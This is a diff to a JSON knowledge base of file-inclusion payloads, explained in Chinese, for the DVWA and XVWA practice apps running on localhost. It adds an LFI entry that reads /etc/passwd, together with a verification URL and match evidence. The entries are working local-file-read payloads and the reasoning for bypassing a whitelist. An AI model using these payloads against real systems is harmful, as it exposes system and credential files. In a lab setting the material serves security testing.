@@ -13,5 +13,18 @@
     "reference_payload": "http://localhost:8081/vulnerabilities/fi/?page=file:///etc/passwd",
     "principle": "fnmatch(\"file*\") 只匹配前缀 file，* 允许通配 ;用 PHP file:// 流包装器 \"file:///etc/passwd\" 既满足前缀又触发本地文件读取，绕过白名单",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030181832",
+    "context": "XVWA fi: GET file 参数直接 include($file)，无白名单/路径过滤，可包含任意本地文件并回显。allow_url_include=Off 故 RFI 不可用，但 LFI 成立。",
+    "reference_payload": "GET /xvwa/vulnerabilities/fi/?file=/etc/passwd",
+    "principle": "include($_GET['file']) 无过滤 → LFI 包含 /etc/passwd 等任意本地文件回显",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/fi/?file=/etc/passwd",
+    "evidence": {
+      "match": "root:x:0:0:root",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/fi/?file=/etc/passwd",
+      "verify": "echo"
+    }
   }
 ]
